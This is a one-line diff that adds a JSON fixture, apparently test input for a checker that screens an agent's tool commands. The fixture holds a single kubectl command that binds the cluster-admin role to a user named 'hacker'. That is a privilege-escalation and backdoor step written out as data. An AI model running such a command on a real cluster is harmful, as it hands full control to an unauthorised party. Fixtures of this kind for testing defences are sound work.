@@ -1,0 +1,1 @@
+{"tool_input":{"command":"kubectl create clusterrolebinding hacker-admin --clusterrole=cluster-admin --user=hacker"}}
